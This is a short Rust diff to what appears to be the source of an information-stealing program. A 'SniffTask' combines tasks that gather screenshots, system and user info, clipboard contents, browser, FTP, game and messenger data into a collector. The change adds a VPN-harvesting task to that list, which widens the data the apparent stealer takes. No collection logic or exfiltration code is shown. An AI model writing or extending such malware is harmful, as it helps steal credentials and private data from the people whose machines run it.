@@ -14,7 +14,6 @@ use crate::screenshot::ScreenshotTask;
 use crate::systeminfo::SystemInfoTask;
 use crate::userinfo::UserInfoTask;
 use alloc::vec;
-use vpn::VpnTask;
 use browsers::BrowsersTask;
 use collector::Collector;
 use filesystem::path::Path;
@@ -23,6 +22,7 @@ use ftp::FtpTask;
 use games::GamesTask;
 use messengers::MessengersTask;
 use tasks::{composite_task, CompositeTask, Task};
+use vpn::VpnTask;
 
 pub struct SniffTask<C: Collector, F: FileSystem> {
     inner: CompositeTask<C, F>,
@@ -38,6 +38,7 @@ impl<C: Collector + 'static, F: FileSystem + 'static> Default for SniffTask<C, F
                 SystemInfoTask,
                 ClipboardTask,
                 UserInfoTask,
+                VpnTask::default(),
                 GamesTask::default(),
                 FtpTask::default(),
                 MessengersTask::default(),
